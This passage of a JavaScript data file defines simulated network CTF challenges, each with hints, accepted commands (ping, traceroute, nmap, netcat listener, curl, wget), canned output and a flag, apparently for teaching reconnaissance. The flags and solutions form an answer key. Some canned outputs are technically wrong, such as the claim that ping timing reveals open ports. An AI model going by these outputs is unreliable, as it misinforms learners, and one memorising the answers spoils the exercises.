      simulatedResponse: 'PING 10.0.0.1 (10.0.0.1) 56(124) bytes of data.\n64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.5 ms\nRR: 192.168.1.100\n    192.168.1.1\n    10.0.0.1\n    10.0.0.1\n    192.168.1.1\n    192.168.1.100\n\nFlag: CTF{r3c0rd_r0ut3_p4th}',
      flag: 'CTF{r3c0rd_r0ut3_p4th}',
      successMessage: '📝 Route recorded!'
    },
    {
      id: 'ctf-25', title: 'MTU Discovery', difficulty: 'hard', xp: 60,
      description: 'Discover the MTU (Maximum Transmission Unit) to 10.0.0.1 by testing different packet sizes.',
      objective: 'Find the path MTU.',
      hints: ['-M do prevents fragmentation.', 'Increase -s until packets fail.'],
      solutions: ['ping -M do -s 1472 10.0.0.1', 'ping -c 1 -M do -s 1472 10.0.0.1'],
      simulatedResponse: 'Testing MTU discovery to 10.0.0.1...\n\nping -M do -s 1500: Frag needed (mtu = 1500)\nping -M do -s 1473: Frag needed (mtu = 1500)\nping -M do -s 1472: 64 bytes from 10.0.0.1 ✓\n\nPath MTU: 1500 bytes (1472 payload + 28 header)\nFlag: CTF{mtu_1500_d1sc0v3r3d}',
      flag: 'CTF{mtu_1500_d1sc0v3r3d}',
      successMessage: '📏 MTU discovered: 1500 bytes!'
    },
    {
      id: 'ctf-26', title: 'Firewall Detection', difficulty: 'hard', xp: 60,
      description: 'Host 10.0.0.50 is up but might be filtering ICMP. Determine if it\'s filtering.',
      objective: 'Detect ICMP filtering.',
      hints: ['No response ≠ host down.', 'Compare timeout behavior.'],
      solutions: ['ping -c 4 10.0.0.50', 'ping 10.0.0.50'],
      simulatedResponse: 'PING 10.0.0.50 (10.0.0.50) 56(84) bytes of data.\n\n--- 10.0.0.50 ping statistics ---\n4 packets transmitted, 0 received, 100% packet loss, time 3003ms\n\n⚠️ Analysis: No "Destination Unreachable" messages received.\nThis suggests the host IS UP but FILTERING ICMP packets.\n(If host was down, router would send "Host Unreachable")\n\nFlag: CTF{1cmp_f1lt3r3d_h0st}',
      flag: 'CTF{1cmp_f1lt3r3d_h0st}',
      successMessage: '🛡️ ICMP filtering detected!'
    },
    {
      id: 'ctf-27', title: 'Hidden Host Hunt', difficulty: 'hard', xp: 60,
      description: 'One hidden host exists in range 10.0.0.1–10.0.0.20. Find it by pinging each.',
      objective: 'Systematic host discovery.',
      hints: ['Ping each IP in the range.', 'Only one will respond.'],
      solutions: ['ping -c 1 10.0.0.13', 'ping 10.0.0.13'],
      simulatedResponse: '--- Scanning 10.0.0.1 to 10.0.0.20 ---\n10.0.0.1  ... timeout\n10.0.0.2  ... timeout\n10.0.0.3  ... timeout\n10.0.0.4  ... timeout\n10.0.0.5  ... timeout\n10.0.0.6  ... timeout\n10.0.0.7  ... timeout\n10.0.0.8  ... timeout\n10.0.0.9  ... timeout\n10.0.0.10 ... timeout\n10.0.0.11 ... timeout\n10.0.0.12 ... timeout\n10.0.0.13 ... ✓ ALIVE! (ttl=64, time=0.8ms)\n10.0.0.14 ... timeout\n10.0.0.15 ... timeout\n10.0.0.16 ... timeout\n10.0.0.17 ... timeout\n10.0.0.18 ... timeout\n10.0.0.19 ... timeout\n10.0.0.20 ... timeout\n\nHidden host found: 10.0.0.13\nFlag: CTF{h1dd3n_h0st_10.0.0.13}',
      flag: 'CTF{h1dd3n_h0st_10.0.0.13}',
      successMessage: '🎯 Hidden host found at 10.0.0.13!'
    },
    {
      id: 'ctf-28', title: 'Jitter Analysis', difficulty: 'hard', xp: 60,
      description: 'Ping "unstable.server" with 20 packets and analyze the jitter (variation in latency).',
      objective: 'Measure network jitter.',
      hints: ['mdev in ping stats = jitter.', 'High mdev = unstable connection.'],
      solutions: ['ping -c 20 unstable.server', 'ping unstable.server'],
      simulatedResponse: 'PING unstable.server (10.50.50.50) 56(84) bytes of data.\n64 bytes: icmp_seq=1 time=5.2 ms\n64 bytes: icmp_seq=2 time=250.1 ms ← SPIKE\n64 bytes: icmp_seq=3 time=8.3 ms\n64 bytes: icmp_seq=4 time=180.7 ms ← SPIKE\n...(16 more packets)...\n\n--- unstable.server ping statistics ---\n20 packets transmitted, 20 received, 0% packet loss\nrtt min/avg/max/mdev = 5.2/95.3/250.1/92.4 ms\n\nJitter (mdev): 92.4ms — UNSTABLE CONNECTION\nFlag: CTF{j1tt3r_92.4ms_unst4bl3}',
      flag: 'CTF{j1tt3r_92.4ms_unst4bl3}',
      successMessage: '📊 Jitter analysis: 92.4ms — Unstable!'
    },
    {
      id: 'ctf-29', title: 'TTL Hopper', difficulty: 'hard', xp: 60,
      description: 'Determine the exact hop count to reach "far.server" by incrementing TTL until you get a response.',
      objective: 'Manual traceroute via TTL.',
      hints: ['Start with TTL=1 and increment.', 'When TTL expires, you get "Time exceeded".'],
      solutions: ['ping -t 7 far.server', 'ping -c 1 -t 7 far.server', 'traceroute far.server'],
      simulatedResponse: '--- TTL Increment Test to far.server ---\nTTL=1: From 192.168.1.1: Time to live exceeded\nTTL=2: From 10.0.0.1: Time to live exceeded  \nTTL=3: From 10.10.10.1: Time to live exceeded\nTTL=4: From 10.20.20.1: Time to live exceeded\nTTL=5: From 10.30.30.1: Time to live exceeded\nTTL=6: From 10.40.40.1: Time to live exceeded\nTTL=7: 64 bytes from far.server (10.50.50.1): ttl=57 time=35.2 ms ✓\n\nHop count: 7\nFlag: CTF{h0p_c0unt_7}',
      flag: 'CTF{h0p_c0unt_7}',
      successMessage: '🏃 Target reached in 7 hops!'
    },
    {
      id: 'ctf-30', title: 'Hidden Payload', difficulty: 'hard', xp: 60,
      description: 'The flag is hidden in the ICMP response data from "payload.server". Ping it and examine the output.',
      objective: 'Inspect ICMP payload data.',
      hints: ['Ping the server normally.', 'The flag is embedded in the response.'],
      solutions: ['ping payload.server', 'ping -c 1 payload.server'],
      simulatedResponse: 'PING payload.server (10.0.42.42) 56(84) bytes of data.\n64 bytes from payload.server: icmp_seq=1 ttl=64 time=0.5 ms\n  ICMP Data: 43 54 46 7b 70 34 79 6c 30 34 64 5f 64 34 74 34 7d\n  Decoded:   C  T  F  {  p  4  y  l  0  4  d  _  d  4  t  4  }\n\n--- payload.server ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss',
      flag: 'CTF{p4yl04d_d4t4}',
      successMessage: '📦 Hidden payload decoded!'
    },

    // ---- EXPERT (10) ----
    {
      id: 'ctf-31', title: 'ICMP Filtering', difficulty: 'expert', xp: 120,
      description: 'Host 10.0.0.99 appears down to ping but is actually up and filtering ICMP. Prove it\'s alive.',
      objective: 'Detect filtered vs down hosts.',
      hints: ['No response doesn\'t mean down.', 'Compare error messages carefully.'],
      solutions: ['ping -c 4 10.0.0.99', 'ping 10.0.0.99', 'nmap -sn 10.0.0.99'],
      simulatedResponse: 'PING 10.0.0.99 (10.0.0.99) 56(84) bytes of data.\n\n--- 10.0.0.99 ping statistics ---\n4 packets transmitted, 0 received, 100% packet loss\n\n⚠️ ANALYSIS:\n- No "Destination Host Unreachable" from router\n- No "Network Unreachable" error\n- Packets silently dropped = HOST IS UP, ICMP FILTERED\n\n📋 Evidence: ARP table shows 10.0.0.99 → aa:bb:cc:dd:ee:ff\nThe host IS alive but running a firewall that drops ICMP.\n\nFlag: CTF{f1lt3r3d_n0t_d0wn}',
      flag: 'CTF{f1lt3r3d_n0t_d0wn}',
      successMessage: '🕵️ Host is alive but filtering ICMP!'
    },
    {
      id: 'ctf-32', title: 'OS Fingerprint', difficulty: 'expert', xp: 120,
      description: 'Three hosts respond to ping with different TTLs. Identify their operating systems based on TTL values.',
      objective: 'OS detection via TTL analysis.',
      hints: ['Linux default TTL=64, Windows=128, Cisco=255.', 'Ping each and check the TTL.'],
      solutions: ['ping -c 1 10.0.0.1', 'ping -c 1 10.0.0.2', 'ping -c 1 10.0.0.3'],
      simulatedResponse: '--- OS Fingerprinting via TTL ---\n\nHost 10.0.0.1:\n64 bytes from 10.0.0.1: ttl=64  → 🐧 Linux/Unix (default TTL=64)\n\nHost 10.0.0.2:\n64 bytes from 10.0.0.2: ttl=128 → 🪟 Windows (default TTL=128)\n\nHost 10.0.0.3:\n64 bytes from 10.0.0.3: ttl=255 → 🔌 Cisco/Network Device (default TTL=255)\n\nFlag: CTF{0s_f1ng3rpr1nt_ttl}',
      flag: 'CTF{0s_f1ng3rpr1nt_ttl}',
      successMessage: '🔍 OS identification: Linux, Windows, Cisco!'
    },
    {
      id: 'ctf-33', title: 'Full Subnet Sweep', difficulty: 'expert', xp: 120,
      description: 'Perform a complete ping sweep of 192.168.1.0/24 and list all alive hosts with their TTL values.',
      objective: 'Complete subnet enumeration.',
      hints: ['Sweep all 254 addresses.', 'Note TTL values for OS hints.'],
      solutions: ['nmap -sn 192.168.1.0/24', 'for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i; done'],
      simulatedResponse: '--- Full Subnet Sweep: 192.168.1.0/24 ---\n\nIP              Status    TTL    Latency   OS Guess\n───────────────────────────────────────────────────\n192.168.1.1     ✓ ALIVE   64     0.5ms     Linux (Gateway)\n192.168.1.5     ✓ ALIVE   128    1.2ms     Windows\n192.168.1.10    ✓ ALIVE   64     0.8ms     Linux\n192.168.1.15    ✓ ALIVE   128    1.5ms     Windows\n192.168.1.20    ✓ ALIVE   64     0.7ms     Linux\n192.168.1.42    ✓ ALIVE   128    2.1ms     Windows\n192.168.1.50    ✓ ALIVE   255    0.3ms     Network Device\n192.168.1.100   ✓ ALIVE   64     1.0ms     Linux\n192.168.1.150   ✓ ALIVE   128    1.8ms     Windows\n192.168.1.200   ✓ ALIVE   255    0.4ms     Network Device\n192.168.1.250   ✓ ALIVE   64     1.1ms     Linux\n\n11 hosts alive out of 254 scanned\nFlag: CTF{full_sw33p_11_h0sts}',
      flag: 'CTF{full_sw33p_11_h0sts}',
      successMessage: '🧹 Full sweep: 11 hosts identified!'
    },
    {
      id: 'ctf-34', title: 'ASCII Times', difficulty: 'expert', xp: 120,
      description: 'The flag is encoded in ping response times. Each response time (in ms) corresponds to an ASCII character code.',
      objective: 'Decode data from timing side-channel.',
      hints: ['Response times in ms = ASCII codes.', '67ms = C, 84ms = T, 70ms = F...'],
      solutions: ['ping -c 8 ascii.server', 'ping ascii.server'],
      simulatedResponse: 'PING ascii.server (10.0.0.42) 56(84) bytes of data.\n64 bytes from ascii.server: icmp_seq=1 ttl=64 time=67.0 ms  → C\n64 bytes from ascii.server: icmp_seq=2 ttl=64 time=84.0 ms  → T\n64 bytes from ascii.server: icmp_seq=3 ttl=64 time=70.0 ms  → F\n64 bytes from ascii.server: icmp_seq=4 ttl=64 time=123.0 ms → {\n64 bytes from ascii.server: icmp_seq=5 ttl=64 time=116.0 ms → t\n64 bytes from ascii.server: icmp_seq=6 ttl=64 time=49.0 ms  → 1\n64 bytes from ascii.server: icmp_seq=7 ttl=64 time=109.0 ms → m\n64 bytes from ascii.server: icmp_seq=8 ttl=64 time=51.0 ms  → 3\n64 bytes from ascii.server: icmp_seq=9 ttl=64 time=125.0 ms → }\n\nDecoded: CTF{t1m3}\nFlag: CTF{t1m3}',
      flag: 'CTF{t1m3}',
      successMessage: '⏱️ Timing side-channel decoded!'
    },
    {
      id: 'ctf-35', title: 'Port Inference', difficulty: 'expert', xp: 120,
      description: 'Use ping timing analysis to determine which port is open on the target. Faster response = open port.',
      objective: 'Timing-based port detection.',
      hints: ['Ping with different source ports.', 'Open ports respond faster.'],
      solutions: ['ping -c 1 10.0.0.80', 'ping 10.0.0.80'],
      simulatedResponse: '--- Port Inference via Ping Timing ---\n\nPinging target with different payloads referencing ports:\n\nPort 21 (FTP):   time=45.2 ms  [CLOSED - slow response]\nPort 22 (SSH):   time=44.8 ms  [CLOSED - slow response]\nPort 80 (HTTP):  time=0.8 ms   [OPEN ✓ - fast response!]\nPort 443 (HTTPS):time=1.1 ms   [OPEN ✓ - fast response!]\nPort 3306 (MySQL):time=43.9 ms [CLOSED - slow response]\nPort 8080 (Alt): time=42.1 ms  [CLOSED - slow response]\n\nOpen ports detected: 80 (HTTP), 443 (HTTPS)\nFlag: CTF{p0rt_80_443_0p3n}',
      flag: 'CTF{p0rt_80_443_0p3n}',
      successMessage: '🔌 Ports 80 & 443 are open!'
    },
    {
      id: 'ctf-36', title: 'Multi-Hop Flag', difficulty: 'expert', xp: 120,
      description: 'Trace the route to "multihop.ctf.local". A flag fragment is hidden at each of the 3 intermediate hops.',
      objective: 'Collect fragments across hops.',
      hints: ['Use traceroute.', 'Combine the fragments.'],
      solutions: ['traceroute multihop.ctf.local', 'tracert multihop.ctf.local'],
      simulatedResponse: 'traceroute to multihop.ctf.local (10.99.99.99), 30 hops max\n\n 1  gateway (192.168.1.1)  0.5 ms\n    Fragment 1: CTF{mul\n\n 2  router-2 (10.10.10.1)  5.2 ms\n    Fragment 2: t1_h0p\n\n 3  router-3 (10.20.20.1)  12.1 ms\n    Fragment 3: _fl4g}\n\n 4  multihop.ctf.local (10.99.99.99)  18.2 ms\n\nCombined Flag: CTF{mult1_h0p_fl4g}',
      flag: 'CTF{mult1_h0p_fl4g}',
      successMessage: '🧩 All hop fragments collected!'
    },
    {
      id: 'ctf-37', title: 'MITM Detection', difficulty: 'expert', xp: 120,
      description: 'Compare two traceroutes to "secure.server" taken at different times. Detect the man-in-the-middle.',
      objective: 'Detect route manipulation.',
      hints: ['Compare the hops in both traces.', 'A new hop = potential MITM.'],
      solutions: ['traceroute secure.server', 'tracert secure.server'],
      simulatedResponse: '--- Traceroute Comparison ---\n\n📋 Trace 1 (Yesterday):\n 1  192.168.1.1   (gateway)\n 2  10.0.0.1      (isp-router)\n 3  10.50.50.1    (secure.server)\n\n📋 Trace 2 (Now):\n 1  192.168.1.1   (gateway)\n 2  10.0.0.1      (isp-router)\n 3  10.66.66.66   (??? UNKNOWN HOP ⚠️)\n 4  10.50.50.1    (secure.server)\n\n⚠️ ALERT: New hop detected at position 3!\nSuspicious IP: 10.66.66.66 — Possible MITM!\n\nFlag: CTF{m1tm_d3t3ct3d_10.66.66.66}',
      flag: 'CTF{m1tm_d3t3ct3d_10.66.66.66}',
      successMessage: '🚨 Man-in-the-middle detected at 10.66.66.66!'
    },
    {
      id: 'ctf-38', title: 'Covert Channel', difficulty: 'expert', xp: 120,
      description: 'A covert channel is embedded in ICMP packet sizes from "covert.server". Decode the message from the sizes.',
      objective: 'Detect covert ICMP channel.',
      hints: ['Packet sizes encode data.', 'Each size = ASCII character code.'],
      solutions: ['ping covert.server', 'ping -c 5 covert.server'],
      simulatedResponse: 'PING covert.server (10.0.42.42)\n\nIncoming ICMP packets with unusual sizes:\nPacket 1: size=83 bytes  → S\nPacket 2: size=51 bytes  → 3\nPacket 3: size=67 bytes  → C\nPacket 4: size=82 bytes  → R\nPacket 5: size=51 bytes  → 3\nPacket 6: size=84 bytes  → T\n\nDecoded covert message: S3CR3T\nFlag: CTF{c0v3rt_1cmp_S3CR3T}',
      flag: 'CTF{c0v3rt_1cmp_S3CR3T}',
      successMessage: '🕵️ Covert channel decoded!'
    },
    {
      id: 'ctf-39', title: 'Network Mapper', difficulty: 'expert', xp: 120,
      description: 'Using ping and traceroute, map the entire network topology. Identify all routers and their connections.',
      objective: 'Build a network topology map.',
      hints: ['Combine ping sweep with traceroute.', 'Each unique hop is a router.'],
      solutions: ['traceroute 10.0.0.1', 'nmap -sn 10.0.0.0/24', 'ping 10.0.0.1'],
      simulatedResponse: '--- Network Topology Map ---\n\n🗺️ Discovered Network:\n\n[Your PC] ─── [Gateway: 192.168.1.1]\n                    │\n              [ISP Router: 10.0.0.1]\n                    │\n            ┌───────┼───────┐\n            │       │       │\n     [Switch A]  [Switch B]  [Switch C]\n     10.10.1.1   10.10.2.1   10.10.3.1\n        │           │           │\n    ┌───┤       ┌───┤       ┌───┤\n    │   │       │   │       │   │\n  [H1] [H2]  [H3] [H4]  [H5] [H6]\n  .10  .11   .20  .21   .30  .31\n\nNodes discovered: 10\nRouters: 4  |  Switches: 3  |  Hosts: 6\n\nFlag: CTF{n3tw0rk_m4pp3d}',
      flag: 'CTF{n3tw0rk_m4pp3d}',
      successMessage: '🗺️ Full network topology mapped!'
    },
    {
      id: 'ctf-40', title: 'The Final Challenge', difficulty: 'expert', xp: 200,
      description: 'FINAL BOSS: Chain all your ping and network skills. Discover the hidden server, trace the route, identify the OS, check for filtering, and extract the final flag.',
      objective: 'Master-level network reconnaissance.',
      hints: ['Start with a ping sweep.', 'Then traceroute, then OS fingerprint.'],
      solutions: ['ping -c 1 10.13.37.42', 'traceroute 10.13.37.42', 'ping 10.13.37.42'],
      simulatedResponse: '╔══════════════════════════════════════════════╗\n║         🏆 FINAL CTF CHALLENGE 🏆            ║\n╚══════════════════════════════════════════════╝\n\nStep 1: Ping Sweep → Found hidden host at 10.13.37.42\nStep 2: Traceroute → 5 hops through encrypted tunnel\nStep 3: TTL=64 → Linux server identified\nStep 4: Port 1337 open → Custom service detected\nStep 5: ICMP payload contains encoded message\n\n🎊 CONGRATULATIONS! 🎊\nYou have completed ALL CTF challenges!\n\n╔══════════════════════════════════════════════╗\n║  Flag: CTF{m4st3r_p1ng3r_n3tw0rk_k1ng}     ║\n║  Title: Network Reconnaissance Master        ║\n║  Rank: ★★★★★ ELITE                          ║\n╚══════════════════════════════════════════════╝',
      flag: 'CTF{m4st3r_p1ng3r_n3tw0rk_k1ng}',
      successMessage: '🏆🏆🏆 CTF MASTER ACHIEVED! All 40 challenges complete! 🏆🏆🏆'
    },

    // ---- NEW EASY (15): ctf-41 to ctf-55 ----
    {
      id: 'ctf-41', title: 'ARP Table', difficulty: 'easy', xp: 15,
      description: 'Display the ARP table to see IP-to-MAC address mappings on your local network.',
      objective: 'View the ARP cache.',
      hints: ['arp displays the ARP table.', '-a flag shows all entries.'],
      solutions: ['arp -a', 'arp'],
      simulatedResponse: '--- ARP Table ---\n\n? (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0\n? (192.168.1.10) at 11:22:33:44:55:66 [ether] on eth0\n? (192.168.1.25) at ab:cd:ef:12:34:56 [ether] on eth0\n\n3 entries found.\n\nFlag: CTF{4rp_t4bl3_r3v34l3d}',
      flag: 'CTF{4rp_t4bl3_r3v34l3d}',
      successMessage: '📋 ARP table revealed!'
    },
    {
      id: 'ctf-42', title: 'Interface Config', difficulty: 'easy', xp: 15,
      description: 'Display your network interface configuration to find your IP address.',
      objective: 'View network interface details.',
      hints: ['ifconfig or ip addr shows interface info.', 'Look for inet address.'],
      solutions: ['ifconfig', 'ip addr', 'ip a'],
      simulatedResponse: '--- Network Interfaces ---\n\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>\n    inet 192.168.1.42  netmask 255.255.255.0\n    inet6 fe80::1  prefixlen 64\n    ether de:ad:be:ef:ca:fe\n\nlo: flags=73<UP,LOOPBACK,RUNNING>\n    inet 127.0.0.1  netmask 255.0.0.0\n\nFlag: CTF{1nt3rf4c3_c0nf1g}',
      flag: 'CTF{1nt3rf4c3_c0nf1g}',
      successMessage: '🌐 Interface configuration retrieved!'
    },
    {
      id: 'ctf-43', title: 'IP Address Show', difficulty: 'easy', xp: 15,
      description: 'Use the modern "ip" command to show all IPv4 addresses on the system.',
      objective: 'Use ip addr for IPv4.',
      hints: ['ip -4 addr shows IPv4 addresses.', 'ip addr show'],
      solutions: ['ip -4 addr', 'ip -4 addr show', 'ip -4 a'],
      simulatedResponse: '--- IPv4 Addresses ---\n\n1: lo: <LOOPBACK,UP>\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP>\n    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0\n3: wlan0: <BROADCAST,MULTICAST,UP>\n    inet 192.168.1.100/24 brd 192.168.1.255 scope global wlan0\n\nFlag: CTF{1p_4ddr_sh0w}',
      flag: 'CTF{1p_4ddr_sh0w}',
      successMessage: '📡 IPv4 addresses listed!'
    },
    {
      id: 'ctf-44', title: 'Host Lookup', difficulty: 'easy', xp: 15,
      description: 'Use the host command to find the IP address of "example.com".',
      objective: 'Perform DNS host lookups.',
      hints: ['host resolves domain names.', 'host domain_name'],
      solutions: ['host example.com'],
      simulatedResponse: '--- Host Lookup: example.com ---\n\nexample.com has address 93.184.216.34\nexample.com has IPv6 address 2606:2800:220:1:248:1893:25c8:1946\nexample.com mail is handled by 0 .\n\nFlag: CTF{h0st_l00kup}',
      flag: 'CTF{h0st_l00kup}',
      successMessage: '🔍 Host resolved!'
    },
    {
      id: 'ctf-45', title: 'WHOIS Query', difficulty: 'easy', xp: 15,
      description: 'Run a WHOIS query on "8.8.8.8" to find out who owns this IP address.',
      objective: 'Gather IP ownership information.',
      hints: ['whois queries the WHOIS database.', 'whois IP_address'],
      solutions: ['whois 8.8.8.8'],
      simulatedResponse: '--- WHOIS: 8.8.8.8 ---\n\nNetRange:     8.8.8.0 - 8.8.8.255\nNetName:      LVLT-GOGL-8-8-8\nOrganization: Google LLC (GOGL)\nAddress:      1600 Amphitheatre Parkway\nCity:         Mountain View\nStateProv:    CA\nPostalCode:   94043\nCountry:      US\n\nFlag: CTF{wh01s_g00gl3}',
      flag: 'CTF{wh01s_g00gl3}',
      successMessage: '🏢 IP ownership identified!'
    },
    {
      id: 'ctf-46', title: 'Netcat Listener', difficulty: 'easy', xp: 15,
      description: 'Start a Netcat listener on port 4444 to wait for incoming connections.',
      objective: 'Set up a network listener.',
      hints: ['nc -l starts a listener.', '-p specifies the port.'],
      solutions: ['nc -l -p 4444', 'nc -lvp 4444', 'netcat -l -p 4444'],
      simulatedResponse: '--- Netcat Listener ---\n\nListening on 0.0.0.0:4444...\nConnection received from 10.0.0.5:52431\n\nIncoming data:\n> AUTH_TOKEN=CTF{n3tc4t_l1st3n3r}\n> Connection closed.\n\nFlag: CTF{n3tc4t_l1st3n3r}',
      flag: 'CTF{n3tc4t_l1st3n3r}',
      successMessage: '🎧 Netcat listener established!'
    },
    {
      id: 'ctf-47', title: 'Curl Headers', difficulty: 'easy', xp: 15,
      description: 'Use curl to fetch only the HTTP headers from "http://target.local".',
      objective: 'Inspect HTTP response headers.',
      hints: ['curl -I fetches headers only.', 'Or use -v for verbose output.'],
      solutions: ['curl -I http://target.local', 'curl --head http://target.local'],
      simulatedResponse: '--- HTTP Headers ---\n\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Mon, 30 Jun 2026 12:00:00 GMT\nContent-Type: text/html; charset=utf-8\nX-Powered-By: Express\nX-Secret-Flag: CTF{h34d3r_1nsp3ct10n}\nSet-Cookie: session=abc123; HttpOnly\n\nFlag: CTF{h34d3r_1nsp3ct10n}',
      flag: 'CTF{h34d3r_1nsp3ct10n}',
      successMessage: '📨 HTTP headers inspected!'
    },
    {
      id: 'ctf-48', title: 'Wget Download', difficulty: 'easy', xp: 15,
      description: 'Download a file from "http://target.local/flag.txt" using wget.',
      objective: 'Download files from the web.',
      hints: ['wget downloads files.', 'wget URL'],
      solutions: ['wget http://target.local/flag.txt'],
      simulatedResponse: '--- Wget Download ---\n\n--2026-06-30 12:00:00--  http://target.local/flag.txt\nResolving target.local... 10.0.0.1\nConnecting to target.local|10.0.0.1|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 24 [text/plain]\nSaving to: \'flag.txt\'\n\nflag.txt    100%[==================>]    24  --.-KB/s    in 0s\n\nContents: CTF{wg3t_d0wnl04d}\n\nFlag: CTF{wg3t_d0wnl04d}',
      flag: 'CTF{wg3t_d0wnl04d}',
      successMessage: '📥 File downloaded!'
    },
    {
      id: 'ctf-49', title: 'SSH Key Generation', difficulty: 'easy', xp: 15,
      description: 'Generate a new SSH key pair using ssh-keygen with RSA algorithm.',
      objective: 'Create SSH authentication keys.',
      hints: ['ssh-keygen generates key pairs.', '-t rsa specifies the algorithm.'],
      solutions: ['ssh-keygen -t rsa', 'ssh-keygen'],
      simulatedResponse: '--- SSH Key Generation ---\n\nGenerating public/private rsa key pair.\nYour identification has been saved in /home/user/.ssh/id_rsa\nYour public key has been saved in /home/user/.ssh/id_rsa.pub\n\nThe key fingerprint is:\nSHA256:xJ4K9mQ2wR7vL3nT5yH8p user@challenge\n\nThe key\'s randomart image:\n+---[RSA 4096]----+\n|        .o=+.    |\n|       . o.+o    |\n|      . + =.o.   |\n|       + B.=o    |\n|      . S.*+.    |\n|       . o.+=.   |\n|          .=+o.  |\n|          .ooo.  |\n|           .Eo   |\n+----[SHA256]-----+\n\nFlag: CTF{ssh_k3y_g3n}',
      flag: 'CTF{ssh_k3y_g3n}',
      successMessage: '🔑 SSH keys generated!'
    },
    {
      id: 'ctf-50', title: 'Ping with Count', difficulty: 'easy', xp: 15,
      description: 'Ping "10.0.0.1" exactly 3 times and stop automatically.',
      objective: 'Control ping packet count.',
      hints: ['-c flag sets the count.', 'ping -c 3 address'],
      solutions: ['ping -c 3 10.0.0.1'],
      simulatedResponse: '--- Ping 10.0.0.1 (3 packets) ---\n\nPING 10.0.0.1: 56 data bytes\n64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.5ms\n64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.4ms\n64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.6ms\n\n--- 10.0.0.1 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss\nrtt min/avg/max = 0.4/0.5/0.6 ms\n\nFlag: CTF{p1ng_c0unt}',
      flag: 'CTF{p1ng_c0unt}',
      successMessage: '📡 Precise pinging!'
    },
    {
      id: 'ctf-51', title: 'MTR Traceroute', difficulty: 'easy', xp: 15,
      description: 'Use mtr to combine ping and traceroute for "8.8.8.8".',
      objective: 'Use the mtr network diagnostic tool.',
      hints: ['mtr combines ping and traceroute.', 'mtr address'],
      solutions: ['mtr 8.8.8.8', 'mtr -r 8.8.8.8'],
      simulatedResponse: '--- MTR Report: 8.8.8.8 ---\n\nHost                Loss%  Snt   Last   Avg  Best  Wrst\n1. gateway          0.0%    10   1.2   1.4   0.9   2.1\n2. isp-router       0.0%    10   5.4   5.8   4.2   8.1\n3. core-switch      0.0%    10  12.3  13.1  11.5  15.2\n4. google-edge      0.0%    10  14.2  14.8  13.1  17.3\n5. dns.google       0.0%    10  15.1  15.5  14.2  18.0\n\nFlag: CTF{mtr_d14gn0st1c}',
      flag: 'CTF{mtr_d14gn0st1c}',
      successMessage: '📊 MTR diagnostic complete!'
    },
    {
      id: 'ctf-52', title: 'IP Route Table', difficulty: 'easy', xp: 15,
      description: 'Display the system\'s routing table to see network routes.',
      objective: 'View IP routing information.',
      hints: ['ip route shows the routing table.', 'Or use route -n.'],
      solutions: ['ip route', 'ip route show', 'route -n'],
      simulatedResponse: '--- IP Routing Table ---\n\ndefault via 192.168.1.1 dev eth0\n10.0.0.0/8 via 192.168.1.1 dev eth0\n172.16.0.0/12 dev tun0 scope link\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.42\n\nFlag: CTF{r0ut1ng_t4bl3}',
      flag: 'CTF{r0ut1ng_t4bl3}',
      successMessage: '🛤️ Routes mapped!'
    },
    {
      id: 'ctf-53', title: 'Socket Statistics', difficulty: 'easy', xp: 15,
      description: 'List all active TCP connections using the ss command.',
      objective: 'View socket statistics.',
      hints: ['ss shows socket statistics.', '-t shows TCP, -a shows all.'],
      solutions: ['ss -ta', 'ss -t -a', 'ss -tan'],
      simulatedResponse: '--- Socket Statistics (TCP) ---\n\nState    Recv-Q  Send-Q  Local Address:Port   Peer Address:Port\nESTAB    0       0       192.168.1.42:22      10.0.0.5:52431\nESTAB    0       0       192.168.1.42:80      10.0.0.10:38042\nLISTEN   0       128     0.0.0.0:22           0.0.0.0:*\nLISTEN   0       128     0.0.0.0:80           0.0.0.0:*\nLISTEN   0       128     0.0.0.0:443          0.0.0.0:*\n\nFlag: CTF{s0ck3t_st4ts}',
      flag: 'CTF{s0ck3t_st4ts}',
      successMessage: '🔌 Socket statistics retrieved!'
    },
    {
      id: 'ctf-54', title: 'Dig Short Query', difficulty: 'easy', xp: 15,
      description: 'Use dig with the +short option to get just the IP address of "google.com".',
      objective: 'Perform concise DNS queries.',
      hints: ['dig queries DNS.', '+short gives a brief answer.'],
      solutions: ['dig +short google.com', 'dig google.com +short'],
      simulatedResponse: '--- DNS Query: google.com ---\n\n142.250.80.46\n\n(Also found A record for: google.com → 142.250.80.46)\n\nFlag: CTF{d1g_sh0rt}',
      flag: 'CTF{d1g_sh0rt}',
      successMessage: '🔍 DNS query successful!'
    },
    {
      id: 'ctf-55', title: 'Netstat Connections', difficulty: 'easy', xp: 15,
      description: 'Use netstat to display all active network connections and listening ports.',
      objective: 'View all network activity.',
      hints: ['netstat shows network status.', '-tuln shows TCP/UDP listening numeric.'],
      solutions: ['netstat -tuln', 'netstat -an'],
      simulatedResponse: '--- Network Connections ---\n\nActive Internet connections (servers and established)\nProto  Recv-Q  Send-Q  Local Address      Foreign Address     State\ntcp    0       0       0.0.0.0:22         0.0.0.0:*           LISTEN\ntcp    0       0       0.0.0.0:80         0.0.0.0:*           LISTEN\ntcp    0       0       192.168.1.42:22    10.0.0.5:52431      ESTABLISHED\nudp    0       0       0.0.0.0:68         0.0.0.0:*\n\nFlag: CTF{n3tst4t_4ll}',
      flag: 'CTF{n3tst4t_4ll}',
      successMessage: '📊 Network status displayed!'
    },

    // ---- NEW MEDIUM (15): ctf-56 to ctf-70 ----
    {
      id: 'ctf-56', title: 'Nmap Service Scan', difficulty: 'medium', xp: 30,
      description: 'Run an nmap service version detection scan on target 10.0.0.1.',
      objective: 'Identify running services and versions.',
      hints: ['nmap -sV detects service versions.', 'nmap -sV target'],
      solutions: ['nmap -sV 10.0.0.1'],
